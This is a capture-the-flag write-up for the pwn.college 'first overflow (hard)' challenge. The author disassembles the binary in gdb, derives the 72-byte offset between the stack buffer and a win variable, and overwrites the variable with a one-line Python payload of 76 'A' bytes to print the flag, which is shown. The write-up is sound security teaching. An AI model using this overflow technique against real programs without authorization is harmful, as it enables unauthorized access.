## Challenge Decription

This challenge is identical to its "easy" version from a security perspective, but has the following changes:

- Unlike the easy version, it does not give you helpful debug output. You will have to recover this information using a debugger.
- For all other "hard" versions, the source code will not be provided, and you will need to reverse-engineer the binary using your knowledge of the "easy" version as a reference. However, for this one challenge, to get you familiar with the differences between the easy and hard versions, we will provide the source code.
- Some randomization is different. Buffers might have different lengths, offsets might vary, etc. You will need to reverse engineer this information from the binary!

## Solution

Even thought the source code was given, I decided to solve this challenge without it using `gdb`

```bash

hacker@binary-exploitation~your-first-overflow-hard:~$ cd /challenge
hacker@binary-exploitation~your-first-overflow-hard:/challenge$ ls -la
total 40
drwxr-xr-x 1 root root  4096 Oct 26 02:43 .
drwxr-xr-x 1 root root  4096 Oct 26 02:43 ..
-rwsr-xr-x 1 root root   748 Jan 27  2025 DESCRIPTION.md
-rwsr-xr-x 1 root root 21376 Jan 27  2025 binary-exploitation-first-overflow
-rwsr-xr-x 1 root root  2052 Jan 27  2025 binary-exploitation-first-overflow.c
hacker@binary-exploitation~your-first-overflow-hard:/challenge$ gdb ./binary-exploitation-first-overflow
GNU gdb (GDB) 16.2
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-unknown-linux-gnu".
Type "show configuration" for configuration details.
--Type <RET> for more, q to quit, c to continue without paging--c
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./binary-exploitation-first-overflow...
(No debugging symbols found in ./binary-exploitation-first-overflow)
(gdb) disassemble challenge
Dump of assembler code for function challenge:
   0x000000000040202e <+0>:     endbr64
   0x0000000000402032 <+4>:     push   %rbp
   0x0000000000402033 <+5>:     mov    %rsp,%rbp
   0x0000000000402036 <+8>:     sub    $0x90,%rsp
   0x000000000040203d <+15>:    mov    %edi,-0x74(%rbp)
   0x0000000000402040 <+18>:    mov    %rsi,-0x80(%rbp)
   0x0000000000402044 <+22>:    mov    %rdx,-0x88(%rbp)
   0x000000000040204b <+29>:    mov    %fs:0x28,%rax
--Type <RET> for more, q to quit, c to continue without paging--c
   0x0000000000402054 <+38>:    mov    %rax,-0x8(%rbp)
   0x0000000000402058 <+42>:    xor    %eax,%eax
   0x000000000040205a <+44>:    lea    -0x60(%rbp),%rdx
   0x000000000040205e <+48>:    mov    $0x0,%eax
   0x0000000000402063 <+53>:    mov    $0x9,%ecx
   0x0000000000402068 <+58>:    mov    %rdx,%rdi
   0x000000000040206b <+61>:    rep stos %rax,%es:(%rdi)
   0x000000000040206e <+64>:    mov    %rdi,%rdx
   0x0000000000402071 <+67>:    mov    %eax,(%rdx)
   0x0000000000402073 <+69>:    add    $0x4,%rdx
   0x0000000000402077 <+73>:    movq   $0x0,-0x68(%rbp)
   0x000000000040207f <+81>:    movq   $0x1000,-0x68(%rbp)
   0x0000000000402087 <+89>:    mov    -0x68(%rbp),%rax
   0x000000000040208b <+93>:    mov    %rax,%rsi
   0x000000000040208e <+96>:    lea    0x107b(%rip),%rdi        # 0x403110
   0x0000000000402095 <+103>:   mov    $0x0,%eax
   0x000000000040209a <+108>:   call   0x401120 <printf@plt>
   0x000000000040209f <+113>:   mov    -0x68(%rbp),%rdx
   0x00000000004020a3 <+117>:   lea    -0x60(%rbp),%rax
   0x00000000004020a7 <+121>:   mov    %rax,%rsi
   0x00000000004020aa <+124>:   mov    $0x0,%edi
   0x00000000004020af <+129>:   call   0x401140 <read@plt>
   0x00000000004020b4 <+134>:   mov    %eax,-0x6c(%rbp)
   0x00000000004020b7 <+137>:   cmpl   $0x0,-0x6c(%rbp)
   0x00000000004020bb <+141>:   jns    0x4020e9 <challenge+187>
   0x00000000004020bd <+143>:   call   0x4010e0 <__errno_location@plt>
   0x00000000004020c2 <+148>:   mov    (%rax),%eax
   0x00000000004020c4 <+150>:   mov    %eax,%edi
   0x00000000004020c6 <+152>:   call   0x401180 <strerror@plt>
   0x00000000004020cb <+157>:   mov    %rax,%rsi
   0x00000000004020ce <+160>:   lea    0x1063(%rip),%rdi        # 0x403138
   0x00000000004020d5 <+167>:   mov    $0x0,%eax
   0x00000000004020da <+172>:   call   0x401120 <printf@plt>
   0x00000000004020df <+177>:   mov    $0x1,%edi
   0x00000000004020e4 <+182>:   call   0x401170 <exit@plt>
   0x00000000004020e9 <+187>:   mov    -0x18(%rbp),%eax
   0x00000000004020ec <+190>:   test   %eax,%eax
   0x00000000004020ee <+192>:   je     0x4020fa <challenge+204>
   0x00000000004020f0 <+194>:   mov    $0x0,%eax
   0x00000000004020f5 <+199>:   call   0x401f27 <win>
   0x00000000004020fa <+204>:   lea    0x105b(%rip),%rdi        # 0x40315c
   0x0000000000402101 <+211>:   call   0x4010f0 <puts@plt>
   0x0000000000402106 <+216>:   mov    $0x0,%eax
   0x000000000040210b <+221>:   mov    -0x8(%rbp),%rcx
   0x000000000040210f <+225>:   xor    %fs:0x28,%rcx
   0x0000000000402118 <+234>:   je     0x40211f <challenge+241>
   0x000000000040211a <+236>:   call   0x401110 <__stack_chk_fail@plt>
   0x000000000040211f <+241>:   leave
   0x0000000000402120 <+242>:   ret
End of assembler dump.
(gdb) exit
```

On analyzing,

```bash
lea    -0x60(%rbp),%rax     # Load address into rax
mov    %rax,%rsi            # Move to rsi
mov    $0x0,%edi            # Put 0 in edi (stdin)
call   0x401140 <read@plt>  # Call read()
```

Now what does this mean? It's like the `read()` function in C

```bash
read(fd, buffer, size);
     ↓     ↓      ↓
    edi   rsi   rdx
```

In x86-64, function arguments go in specific registers:

1st arg (fd) → %rdi = 0 (stdin = keyboard input)
2nd arg (buffer) → %rsi = address where input goes
3rd arg (size) → %rdx = how many bytes to read

So, `lea -0x60(%rbp),%rax` and `mov %rax,%rsi` is loading the address `rbp-0x60` into `%rsi`, which is the buffer address. Therefore the buffer is 96 bytes below the base pointer

Now I needed to find the location of `win_variable`

```bash
mov    -0x18(%rbp),%eax     # Load value from memory
test   %eax,%eax            # Check if it's zero
je     0x4020fa             # Jump if zero
call   0x401f27 <win>       # Call win if NOT zero!
```

Since the value is being loaded from `rbp-0x18`, `win_variable`  is 24 bytes below the base pointer

Then I calculated the offset to fill the buffer

```bash
Buffer start:     rbp - 0x60 (96 in decimal)
Win variable:     rbp - 0x18 (24 in decimal)
Offset = 96 - 24 = 72 bytes
```

So in the exploit, I need to send 72 bytes to fill the buffer and extra 4 bytes to overwrite `win_variable` with non-zero value

```bash
hacker@binary-exploitation~your-first-overflow-hard:/challenge$ python3 -c "print('A' * 76)" | ./binary-exploitation-first-overflow
Send your payload (up to 4096 bytes)!
You win! Here is your flag:
pwn.college{4kyao_scpJrxmwf1RhYuqcyo9xZ.0FM5IDLyMjN0czW}


Goodbye!
```


